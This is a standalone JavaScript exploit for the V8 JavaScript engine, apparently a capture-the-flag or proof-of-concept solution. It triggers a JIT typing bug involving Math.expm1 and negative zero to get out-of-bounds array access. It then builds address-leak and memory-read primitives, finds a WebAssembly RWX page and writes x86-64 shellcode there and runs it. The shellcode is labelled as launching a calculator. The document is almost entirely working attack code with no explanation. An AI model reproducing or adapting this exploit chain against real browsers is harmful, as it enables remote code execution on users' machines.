/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var oob_arr = [];

function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let victim = [0.5, 0.6, 0.7, 0.8];
    oob_arr = victim;
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    return a[b * 13] = 0x100;
}

foo(0);
for (let i = 0; i < 0x20000; i++) {
    foo("0");
}
var leak = foo(-0);
var ab = new ArrayBuffer(0x100);
var obj = {}
var ab_arr = [obj];

var wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

%DebugPrint(oob_arr);
%DebugPrint(func);
print(oob_arr.length);
// oob_arr[14] = backward pointer

function addrof(obj){
    ab_arr[0] = obj;
    return ftoi(oob_arr[27]);
}

var func_addr = addrof(func);
print("func_addr = 0x" + func_addr.toString(16));

var dv = new DataView(ab);
function read(addr){
    oob_arr[14] = itof(addr);
    return ftoi(dv.getFloat64(0, true));
}

var s1 = read(func_addr-1n+0x18n);
var rwx = read(s1-1n-0xc0n);
print("rwx_page = 0x" + rwx.toString(16));

// write shellcode
oob_arr[14] = itof(rwx);
// pop calc shellcode
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
for (let i = 0; i < shellcode.length; i++) {
    dv.setUint32(i * 4, shellcode[i], true);
}

func();
